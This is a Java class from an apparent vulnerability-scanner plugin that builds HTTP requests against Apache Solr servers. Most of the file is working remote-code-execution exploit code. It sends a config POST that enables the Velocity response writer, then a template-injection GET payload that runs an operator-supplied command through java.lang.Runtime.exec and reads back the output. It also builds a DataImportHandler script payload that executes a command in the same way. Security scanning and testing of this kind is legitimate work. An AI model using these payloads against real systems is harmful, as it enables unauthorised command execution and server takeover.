package com.gbw.scanner.plugins.scripts.web.solr;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpGetRequestBuilder;
import com.gbw.scanner.http.GBWHttpPostRequestBuilder;
import com.xmap.api.utils.TextUtils;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

public class SolrHttpRequestBuilder {

    private static final String solrAdminCoreURL = "/solr/admin/cores?wt=json";
    private static final String solrConfigURL = "/solr/admin/file/?contentType=text/xml;charset=utf-8&file=solrconfig.xml";
    private static final String UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36";
    private static final String velConfigJson = "{\n" +
            "  \"update-queryresponsewriter\": {\n" +
            "    \"startup\": \"lazy\",\n" +
            "    \"name\": \"velocity\",\n" +
            "    \"class\": \"solr.VelocityResponseWriter\",\n" +
            "    \"template.base.dir\": \"\",\n" +
            "    \"solr.resource.loader.enabled\": \"true\",\n" +
            "    \"params.resource.loader.enabled\": \"true\"\n" +
            "  }\n" +
            "}";

    private static final String payloadBefore =
            "q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23" +
                    "set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))" +
                    "+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec($str.valueOf(%27";

    public static final String payloadAfter = "%27).split(%22,%22)))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end";


    public static String makePayload(String cmd,String core,boolean isEncode){

        StringBuffer sb = new StringBuffer("/solr");
        if(isEncode) {
            try {
                String ncmd = URLEncoder.encode(cmd,"UTF-8");
                cmd = ncmd;
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        if(TextUtils.isEmpty(core))
            sb.append("/select?");
        else
            sb.append(String.format("/%s/select?",core));

        sb.append(payloadBefore);
        sb.append(cmd);
        sb.append(payloadAfter);

        return sb.toString();
    }

    public static String makeDataImportPayload(String cmd,boolean isEncode){

        if(isEncode) {
            try {
                String ncmd = URLEncoder.encode(cmd,"UTF-8");
                cmd = ncmd;
            } catch (UnsupportedEncodingException e) {
            }
        }

        String payload = "command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&" +
                "dataConfig=%%3CdataConfig%%3E%%0A++%%3CdataSource+type%%3D%%22URLDataSource%%22%%2F%%3E%%0A++%%3Cscript%%3E%%3C!%%5BCDATA%%5B%%0A++++++++++" +
                "function+poc()%%7B+java.lang.Runtime.getRuntime().exec(%%22" +cmd+
                "%%22)%%3B%%0A" +
                "++++++++++%%7D%%0A++%%5D%%5D%%3E%%3C%%2Fscript%%3E%%0A++%%3Cdocument%%3E%%0A++++%%3Centity+name%%3D%%22stackoverflow%%22%%0A++++++++++++" +
                "url%%3D%%22https%%3A%%2F%%2Fstackoverflow.com%%2Ffeeds%%2Ftag%%2Fsolr%%22%%0A++++++++++++processor%%3D%%22XPathEntityProcessor%%22%%0A++++++++++++" +
                "forEach%%3D%%22%%2Ffeed%%22%%0A++++++++++++transformer%%3D%%22script%%3Apoc%%22+%%2F%%3E%%0A++%%3C%%2Fdocument%%3E%%0A%%3C%%2FdataConfig%%3E&name=dataimport";

        return payload;
    }

    public static HttpGet makeSolrCoreAdminRequest(Host host, GBWScanSolrScriptConfig config){


        return new GBWHttpGetRequestBuilder(host.getProto(),host.getServer(),host.getPort(),solrAdminCoreURL)
                .addHead("User-Agent",UA)
                .setTimeout(config.getConTimeout(),config.getReadTimeout())
                .build();

    }

    public static HttpGet makeSolrCoreConfigRequest(Host host, GBWScanSolrScriptConfig config,String core){

        String uri;

        if(TextUtils.isEmpty(core))
            uri = String.format("%s",solrConfigURL);
        else
            uri = String.format("/solr/%s/config?wt=json",core);

        return new GBWHttpGetRequestBuilder(host.getProto(),host.getServer(),host.getPort(),uri)
                .addHead("User-Agent",UA)
                .setTimeout(config.getConTimeout(),config.getReadTimeout())
                .build();
    }

    public static HttpPost makeSolrCoreConfigPostRequest(Host host, GBWScanSolrScriptConfig config,String core) throws IOException {

        String uri;

        if(TextUtils.isEmpty(core))
            uri = solrConfigURL;
        else
            uri = String.format("/solr/%s/config?wt=json",core);

        return new GBWHttpPostRequestBuilder(host.getProto(),host.getServer(),host.getPort(),uri)
                .addHead("User-Agent",UA)
                .addHead("Content-Type","application/json")
                .setTimeout(config.getConTimeout(),config.getReadTimeout())
                .postString(velConfigJson,false)
                .build();
    }

    public static HttpGet makeSolrCoreAttackRequest(Host host, GBWScanSolrScriptConfig config, String core){

        return new GBWHttpGetRequestBuilder(host.getProto(),host.getServer(),host.getPort(),makePayload(config.getCmd(),core,config.isEncode()))
                .addHead("User-Agent",UA)
                .setTimeout(config.getConTimeout(),config.getReadTimeout())
                .build();
    }

    public static HttpPost makeSolrDataimportPocRequest(Host host, GBWScanSolrScriptConfig config, String core) throws IOException {

        String payload = makeDataImportPayload(config.getCmd(),config.isEncode());
        String refer = String.format("%s:%s:%d/solr/",TextUtils.isEmpty(host.getProto())?"http":host.getProto(),host.getServer(),host.getPort());

        return new GBWHttpPostRequestBuilder(host.getProto(),host.getServer(),host.getPort(),String.format("/solr/%s/dataimport?wt=json",core))
                .addHead("User-Agent",UA)
                .addHead("Content-Type","application/x-www-form-urlencoded")
                .addHead("Accept","application/json, text/plain, */*")
                .addHead("X-Requested-With","XMLHttpRequest")
                .addHead("Referer",refer)
                .setTimeout(config.getConTimeout(),config.getReadTimeout())
                .postString(payload,false)
                .build();

    }

}
